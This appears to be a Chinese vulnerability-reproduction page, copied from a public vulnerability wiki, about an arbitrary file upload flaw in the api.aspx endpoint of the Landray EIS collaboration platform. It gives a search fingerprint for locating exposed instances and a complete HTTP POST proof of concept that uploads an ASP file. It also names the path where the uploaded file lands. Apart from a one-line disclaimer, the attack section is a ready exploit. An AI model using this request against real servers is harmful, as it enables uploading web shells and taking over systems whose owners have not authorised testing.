---
title: "蓝凌EIS 智慧协同平台 api.aspx 任意文件上传漏洞"
date: 2026-10-17 09:13:24
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "蓝凌EIS-智慧协同平台"
tags:
  - "蓝凌EIS-智慧协同平台"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

蓝凌EIS 智慧协同平台 api.aspx 文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件

## 漏洞影响

蓝凌EIS 智慧协同平台

## 网络测绘

```
icon_hash="953405444"
```

## 漏洞复现

登陆页面

![image-20231116141557650](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116141557650.png)

poc

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Length: 219
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynUqjgvhmkL1dxpCV
Upgrade-Insecure-Requests: 1

------WebKitFormBoundarynUqjgvhmkL1dxpCV
Content-Disposition: form-data; name="file"filename="test.asp"
Content-Type: text/html

&lt;% response.write("Test")%&gt;
------WebKitFormBoundarynUqjgvhmkL1dxpCV--</code></pre>

</details>

![image-20231116141617020](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116141617020.png)

```
/files/editor_img/xxx/xxx.asp
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%93%9D%E5%87%8CEIS-%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0-api.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
